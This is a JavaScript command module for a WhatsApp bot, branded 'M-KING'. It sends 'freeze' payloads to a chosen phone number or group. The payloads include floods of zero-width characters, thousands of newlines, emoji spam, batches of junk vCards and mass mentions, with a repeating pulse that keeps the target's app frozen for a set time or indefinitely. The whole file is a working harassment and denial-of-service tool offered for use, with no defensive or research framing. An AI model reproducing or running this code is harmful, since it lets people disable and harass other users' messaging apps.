'use strict';
/**
 * bug.js — Premium WhatsApp freeze payloads
 * $bug <number> [mode] [time]
 * $bug off <number>   |  $bug stop <number>  |  $bug status
 * reply karke bhi chalta hai
 * modes: zw | nl | emoji | vcard | mention | hard | nightmare
 * time: 30s | 2m | 1h | inf   (default 120s, phir khud off)
 */

const ZW = '\u200b\u200c\u200d\u2060\ufeff';
const MODES = ['zw', 'nl', 'emoji', 'vcard', 'mention', 'hard', 'nightmare'];
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const active = new Map(); // number -> { pulse, end, chatId }

/* ── helpers ─────────────────────────────────────────────────────────────── */

function digits(v) {
    return String(v || '').replace(/[^0-9]/g, '');
}

function readText(message) {
    return message.message?.conversation
        || message.message?.extendedTextMessage?.text
        || '';
}

function quotedSender(message) {
    const ctx = message.message?.extendedTextMessage?.contextInfo
             || message.message?.imageMessage?.contextInfo;
    return ctx?.participant || null;
}

function parseDur(v) {
    if (!v) return 120;
    const s = String(v).toLowerCase();
    if (s === 'inf' || s === 'infinite' || s === '0') return 0;
    const m = s.match(/^(\d+)([smh]?)$/);
    if (!m) return 120;
    const n = parseInt(m[1], 10);
    if (!n) return 0;
    const u = m[2] || 's';
    return u === 's' ? n : u === 'm' ? n * 60 : n * 3600;
}

function fmtDur(sec) {
    if (!sec) return 'infinite';
    if (sec < 60) return sec + 's';
    if (sec < 3600) return Math.round(sec / 60) + 'm';
    return Math.round(sec / 3600) + 'h';
}

async function resolveJid(sock, raw) {
    if (String(raw).includes('@')) return String(raw);
    const num = digits(raw);
    if (!num || num.length < 8 || num.length > 15) return null;
    try {
        const res = await sock.onWhatsApp(num);
        if (Array.isArray(res) && res[0]?.exists && res[0]?.jid) return res[0].jid;
    } catch {}
    return num + '@s.whatsapp.net';
}

/* ── payloads ────────────────────────────────────────────────────────────── */

const P = {
    zw: () => ({ text: ZW.repeat(1800) + '\n\n💀 *M-KING*' }),
    nl: () => ({ text: '\u200b' + '\n'.repeat(2500) + '💀 *M-KING*' }),
    emoji: () => ({ text: '💀'.repeat(1500) }),
    vcard: (n = 120) => {
        const contacts = [];
        for (let i = 0; i < n; i++) {
            contacts.push({
                vcard:
                    'BEGIN:VCARD\nVERSION:3.0\n' +
                    `FN:BUG-${i}-${'X'.repeat(24)}\n` +
                    `TEL;type=CELL;type=VOICE;waid=1000000${i}:+1000000${i}\n` +
                    'END:VCARD',
            });
        }
        return { contacts, text: '💀 *M-KING*' };
    },
    mention: (n = 250) => {
        const mentions = [];
        for (let i = 0; i < n; i++) mentions.push(`92${3000000000 + i}@s.whatsapp.net`);
        return { text: ZW.repeat(400) + '\n' + mentions.map((m) => '@' + m.split('@')[0]).join(' '), mentions };
    },
    pulse: () => ({ text: ZW.repeat(500) }),
};

function payloadsFor(mode, isGroup) {
    switch (mode) {
        case 'zw':        return [P.zw()];
        case 'nl':        return [P.nl()];
        case 'emoji':     return [P.emoji()];
        case 'vcard':     return [P.vcard(150)];
        case 'mention':   return [isGroup ? P.mention(300) : P.zw()];
        case 'nightmare': return [P.zw(), P.vcard(150), P.nl(), P.emoji()];
        case 'hard':
        default:          return [P.zw(), P.vcard(120), P.nl()];
    }
}

/* ── repair / off ────────────────────────────────────────────────────────── */

async function repair(sock, jid, label = '') {
    try {
        await sock.sendMessage(jid, {
            text: '✅ *BUG KHATAM*' + (label ? `\n${label}` : '') + '\n\n_M-KING ⚡_',
        });
    } catch {}
}

function cancel(num) {
    const rec = active.get(num);
    if (!rec) return false;
    clearTimeout(rec.pulse);
    clearTimeout(rec.end);
    active.delete(num);
    return true;
}

/* ── main ────────────────────────────────────────────────────────────────── */

async function bugCommand(sock, chatId, message) {
    const args = readText(message).trim().split(/\s+/).slice(1);
    const isGroup = chatId.endsWith('@g.us');

    try {
        /* subcommands */
        const sub = (args[0] || '').toLowerCase();

        if (sub === 'status') {
            if (!active.size) {
                return sock.sendMessage(chatId, { text: '💤 Koi active bug nahi hai.' }, { quoted: message });
            }
            const lines = [...active.entries()].map(([n, r]) =>
                `• *${n}* — ${r.end ? 'auto-off pending' : 'infinite'}`
            ).join('\n');
            return sock.sendMessage(chatId, { text: `💀 *ACTIVE BUGS*\n\n${lines}` }, { quoted: message });
        }

        if (sub === 'off' || sub === 'stop') {
            let t = args[1] || (quotedSender(message) ? quotedSender(message).split('@')[0].split(':')[0] : '');
            const num = digits(t);
            if (!num) {
                return sock.sendMessage(chatId, { text: `❌ Usage: $bug ${sub} <number>` }, { quoted: message });
            }
            const jid = await resolveJid(sock, num);
            const was = cancel(num);
            if (sub === 'off') await repair(sock, jid || num + '@s.whatsapp.net', 'Manually off kiya gaya.');
            return sock.sendMessage(chatId, {
                text: `${sub === 'off' ? '🛠 Repair bhej diya' : '⏹ Timer band kar diya'} → *${num}*\n${was ? '' : '_(koi timer chal raha tha nahi)_'}`,
            }, { quoted: message });
        }

        /* target + mode + time */
        let target = args[0];
        let mode = (args[1] || '').toLowerCase();
        let time = args[2];

        if (target && !/^[0-9+@.\-]{6,}$/.test(target)) {
            mode = target.toLowerCase();
            target = null;
            time = args[1];
        }

        if (!target) {
            const qs = quotedSender(message);
            if (qs) target = qs.split('@')[0].split(':')[0];
        }

        if (!target) {
            return sock.sendMessage(chatId, {
                text:
                    '💀 *BUG COMMAND — M-KING*\n\n' +
                    '*$bug <number>* — bug bhejo\n' +
                    '*$bug <number> <mode> [time]* — mode aur time\n' +
                    '*$bug off <number>* — repair (unbug)\n' +
                    '*$bug stop <number>* — timer cancel\n' +
                    '*$bug status* — active list\n\n' +
                    `*Modes:* ${MODES.join(', ')}\n` +
                    '*Time:* 30s · 2m · 1h · inf  _(default 120s)_\n\n' +
                    '_Number country code ke sath, bina + ke._\n' +
                    '_Apna number test karo to apna WhatsApp bhi freeze hoga._',
            }, { quoted: message });
        }

        const num = digits(target);
        if (!num || num.length < 8) {
            return sock.sendMessage(chatId, { text: '❌ Number sahi nahi lag raha.' }, { quoted: message });
        }
        if (!MODES.includes(mode)) mode = 'hard';

        const dur = parseDur(time);
        const jid = await resolveJid(sock, num);
        if (!jid) {
            return sock.sendMessage(chatId, { text: '❌ Number resolve nahi hua.' }, { quoted: message });
        }

        cancel(num); // purana timer hatao

        await sock.sendMessage(chatId, {
            text: `🚀 *SENDING PAYLOAD*\n→ ${num}\n🎛 mode: *${mode}*  ⏱ ${dur ? fmtDur(dur) : 'infinite'}\n\n⏳ please wait…`,
        }, { quoted: message });

        let ok = 0;
        for (const p of payloadsFor(mode, jid.endsWith('@g.us'))) {
            try { await sock.sendMessage(jid, p); ok++; } catch (e) { console.error('[bug] send:', e.message); }
            await sleep(900);
        }

        if (!ok) {
            return sock.sendMessage(chatId, { text: '❌ Bhej nahi saka. Number check karo.' }, { quoted: message });
        }

        await sock.sendMessage(chatId, {
            text: `✅ *DONE* → ${num}\n${ok} payload delivered.\n${dur ? `⏱ ${fmtDur(dur)} baad khud off hoga.` : '♾ Manually off karo.'}`,
        }, { quoted: message });

        const rec = { pulse: null, end: null, chatId };
        active.set(num, rec);

        // pulse — bug ko zinda rakhta hai
        rec.pulse = setInterval(async () => {
            try { await sock.sendMessage(jid, P.pulse()); } catch {}
        }, 25000);
        if (rec.pulse.unref) rec.pulse.unref();

        // auto off
        if (dur) {
            rec.end = setTimeout(async () => {
                cancel(num);
                await repair(sock, jid, `Auto-off ho gaya (${fmtDur(dur)}).`);
            }, dur * 1000);
            if (rec.end.unref) rec.end.unref();
        }

    } catch (err) {
        console.error('[bug]', err.message);
        await sock.sendMessage(chatId, { text: '❌ Bug command fail ho gaya.' }, { quoted: message });
    }
}

module.exports = { bugCommand };
module.exports.bugCommand = bugCommand;
